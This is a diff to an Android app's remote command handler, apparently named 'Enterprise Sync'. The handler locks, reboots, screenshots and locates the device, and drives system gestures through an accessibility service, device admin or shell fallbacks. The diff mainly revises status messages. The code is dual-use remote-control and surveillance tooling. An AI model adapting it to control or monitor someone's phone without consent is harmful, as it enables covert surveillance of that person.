@@ -129,7 +129,7 @@ class RemoteCommandManager(private val context: Context) {
                     resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                 }
                 "GLOBAL_BACK", "BACK" -> {
-                    val accActive = RemoteAccessibilityService.isServiceEnabled()
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
                     if (res) {
                         resultMessage = "Executed Global Back gesture successfully."
@@ -142,15 +142,15 @@ class RemoteCommandManager(private val context: Context) {
                         } catch (_: Exception) {}
 
                         if (shellSuccess) {
-                            resultMessage = "Executed Back gesture via shell fallback (Accessibility Service is OFF)."
+                            resultMessage = if (isAccEnabled) "Executed Back gesture via system shell fallback." else "Executed Back gesture via shell fallback (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = "Failed to execute Back gesture: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to execute Back gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Back gesture: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
                         }
                     }
                 }
                 "GLOBAL_HOME", "HOME" -> {
-                    val accActive = RemoteAccessibilityService.isServiceEnabled()
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
                     if (res) {
                         resultMessage = "Executed Global Home gesture successfully."
@@ -166,15 +166,15 @@ class RemoteCommandManager(private val context: Context) {
                         } catch (_: Exception) {}
 
                         if (intentSuccess) {
-                            resultMessage = "Executed Home action via system intent launcher (Accessibility Service is OFF)."
+                            resultMessage = if (isAccEnabled) "Executed Home action via system intent launcher." else "Executed Home action via system intent launcher (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = "Failed to execute Home gesture: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to execute Home gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Home gesture: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
                         }
                     }
                 }
                 "GLOBAL_RECENTS", "RECENTS" -> {
-                    val accActive = RemoteAccessibilityService.isServiceEnabled()
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
                     if (res) {
                         resultMessage = "Executed Global Recents gesture successfully."
@@ -187,15 +187,15 @@ class RemoteCommandManager(private val context: Context) {
                         } catch (_: Exception) {}
 
                         if (shellSuccess) {
-                            resultMessage = "Opened Recents via shell fallback (Accessibility Service is OFF)."
+                            resultMessage = if (isAccEnabled) "Opened Recents via system shell fallback." else "Opened Recents via shell fallback (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = "Failed to open Recents: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to open Recents: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to open Recents: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
                         }
                     }
                 }
                 "GLOBAL_NOTIFICATIONS", "NOTIFICATIONS" -> {
-                    val accActive = RemoteAccessibilityService.isServiceEnabled()
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                     if (res) {
                         resultMessage = "Expanded Notification shade successfully."
@@ -214,15 +214,15 @@ class RemoteCommandManager(private val context: Context) {
                         }
 
                         if (shellSuccess) {
-                            resultMessage = "Expanded Notification shade via shell fallback (Accessibility Service is OFF)."
+                            resultMessage = if (isAccEnabled) "Expanded Notification shade via system statusbar fallback." else "Expanded Notification shade via shell fallback (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = "Failed to expand Notifications: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to expand Notifications: Accessibility Service is enabled, but system blocked shade expansion (e.g. screen locked or keyguard active)." else "Failed to expand Notifications: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
                         }
                     }
                 }
                 "GLOBAL_QUICK_SETTINGS", "QUICK_SETTINGS" -> {
-                    val accActive = RemoteAccessibilityService.isServiceEnabled()
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
                     if (res) {
                         resultMessage = "Expanded Quick Settings successfully."
@@ -241,14 +241,65 @@ class RemoteCommandManager(private val context: Context) {
                         }
 
                         if (shellSuccess) {
-                            resultMessage = "Expanded Quick Settings via shell fallback (Accessibility Service is OFF)."
+                            resultMessage = if (isAccEnabled) "Expanded Quick Settings via system statusbar fallback." else "Expanded Quick Settings via shell fallback (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = "Failed to expand Quick Settings: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                            resultMessage = if (isAccEnabled) "Failed to expand Quick Settings: Accessibility Service is enabled, but system blocked shade expansion." else "Failed to expand Quick Settings: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
                         }
                     }
                 }
-                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK", "LOCK_DEVICE", "LOST_MODE", "LOCK_WITH_MESSAGE" -> {
+                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK", "LOCK_DEVICE" -> {
+                    var locked = false
+                    var lockMethod = ""
+
+                    // 1. Accessibility Service Screen Lock (Android 9+)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        if (RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)) {
+                            locked = true
+                            lockMethod = "Accessibility Service"
+                        }
+                    }
+
+                    // 2. Device Policy Manager Lock
+                    if (!locked) {
+                        try {
+                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+                            val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
+                            if (dpm != null && dpm.isAdminActive(adminComponent)) {
+                                dpm.lockNow()
+                                locked = true
+                                lockMethod = "Device Admin"
+                            }
+                        } catch (e: Exception) {
+                            Log.e("RemoteCommandManager", "Device Policy Manager screen lock error: ${e.message}")
+                        }
+                    }
+
+                    // 3. Shell Power keyevent fallback
+                    if (!locked) {
+                        try {
+                            val p = Runtime.getRuntime().exec("input keyevent 26")
+                            p.waitFor()
+                            if (p.exitValue() == 0) {
+                                locked = true
+                                lockMethod = "Shell Power keyevent"
+                            }
+                        } catch (_: Exception) {}
+                    }
+
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
+
+                    if (locked) {
+                        resultMessage = "Locked device screen successfully via $lockMethod."
+                    } else if (!isAccEnabled) {
+                        isSuccess = false
+                        resultMessage = "Failed to lock screen: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                    } else {
+                        isSuccess = false
+                        resultMessage = "Failed to lock screen: Accessibility Service is enabled, but screen lock action was not supported by OS state."
+                    }
+                }
+                "LOST_MODE", "LOCK_WITH_MESSAGE", "ACTIVATE_LOST_MODE" -> {
                     var customMsg: String? = null
                     var ownerPhone: String? = null
                     var unlockPin: String? = null
@@ -308,7 +359,7 @@ class RemoteCommandManager(private val context: Context) {
                     }
                 }
                 "GLOBAL_POWER_DIALOG", "POWER_DIALOG", "POWER_MENU", "POWER", "REBOOT", "SHUTDOWN", "POWER_OFF" -> {
-                    val accActive = RemoteAccessibilityService.isServiceEnabled()
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                     if (res) {
                         resultMessage = "Power Dialog displayed successfully via Accessibility Service."
@@ -328,15 +379,15 @@ class RemoteCommandManager(private val context: Context) {
                         }
 
                         if (adminRebootSuccess) {
-                            resultMessage = "Reboot initiated via Device Policy Manager (Accessibility Service is OFF)."
+                            resultMessage = if (isAccEnabled) "Reboot initiated via Device Policy Manager." else "Reboot initiated via Device Policy Manager (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = "Failed to open Power Menu / Reboot: Accessibility Service is OFF and Device Admin reboot is not active. Enable Accessibility Service in Settings."
+                            resultMessage = if (isAccEnabled) "Failed to open Power Menu / Reboot: Accessibility Service is enabled, but Device Admin reboot is not configured." else "Failed to open Power Menu / Reboot: Accessibility Service is OFF and Device Admin reboot is not active. Enable Accessibility Service in Settings."
                         }
                     }
                 }
                 "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
-                    val accActive = RemoteAccessibilityService.isServiceEnabled()
+                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                     var res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                         RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
                     } else false
@@ -345,7 +396,7 @@ class RemoteCommandManager(private val context: Context) {
                         resultMessage = "Took Screenshot successfully via Accessibility Service."
                     } else {
                         isSuccess = false
-                        resultMessage = "Failed to take screenshot: Accessibility Service is OFF. Screen capture requires Enterprise Sync Accessibility Service enabled in Settings."
+                        resultMessage = if (isAccEnabled) "Failed to take screenshot: Accessibility Service is enabled, but system blocked capture (requires Android 9+)." else "Failed to take screenshot: Accessibility Service is OFF. Screen capture requires Enterprise Sync Accessibility Service enabled in Settings."
                     }
                 }
                 "FLASHLIGHT_ON", "TORCH_ON", "FLASHLIGHT_ENABLE" -> {
